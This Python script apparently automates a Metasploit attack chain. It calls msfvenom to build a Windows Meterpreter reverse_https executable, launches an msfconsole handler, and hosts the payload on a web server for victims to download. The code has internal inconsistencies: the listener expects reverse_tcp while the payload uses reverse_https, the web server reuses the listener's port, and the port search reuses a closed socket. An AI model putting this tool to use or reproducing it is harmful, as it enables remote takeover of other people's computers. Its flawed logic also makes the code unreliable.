#!/usr/bin/env python3

import argparse
import os
import subprocess
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import socket

# Default values
LPORT = 11506
DOWNLOAD_DIR = "/var/www/html/downloads"
CONFIG_FILE = "payload_config.txt"
VERBOSE = 0

def find_available_port(start_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    for port in range(start_port, 65536):
        try:
            sock.bind(('localhost', port))
            sock.close()
            return port
        except OSError:
            continue

    raise OSError('No available ports')

def start_server(lhost, lport, download_dir, payload_name):
    os.chdir(download_dir)

    # Define custom request handler for HTTP server
    class CustomHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            if VERBOSE:
                print(f"Visitor: {self.client_address[0]}")

    print(f"Web server started at http://{lhost}:{lport}/")
    print(f"To download the payload, visit http://{lhost}:{lport}/{payload_name}")

    httpd = HTTPServer((lhost, lport), CustomHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

    httpd.server_close()
    print("Web server stopped.")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-l', '--lhost', type=str, help='Specify the LHOST value', default=socket.gethostbyname(socket.gethostname()))
    parser.add_argument('-p', '--lport', type=int, help='Specify the LPORT value', default=LPORT)
    parser.add_argument('-d', '--dir', type=str, help='Specify the download directory', default=DOWNLOAD_DIR)
    parser.add_argument('-c', '--config', type=str, help='Specify a configuration file', default=CONFIG_FILE)
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    args = parser.parse_args()

    global VERBOSE
    VERBOSE = args.verbose

    payload_name = f"payload_{int(time.time())}.exe"
    payload_path = os.path.join(args.dir, payload_name)

    # Find an available port
    lport = find_available_port(args.lport)

    print("Generating payload...")
    subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_https', 'LHOST=' + args.lhost, 'LPORT=' + str(lport), '-f', 'exe', '-o', payload_path], check=True)

    print("Setting file permissions...")
    os.chmod(payload_path, 0o644)

    print("Starting Metasploit listener...")
    subprocess.Popen(['gnome-terminal', '--', 'msfconsole', '-q', '-x', f"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT {lport}; run"])

    print("Starting web server...")
    server_thread = threading.Thread(target=start_server, args=(args.lhost, lport, args.dir, payload_name))
    server_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping web server and Metasploit listener...")

if __name__ == "__main__":
    main()
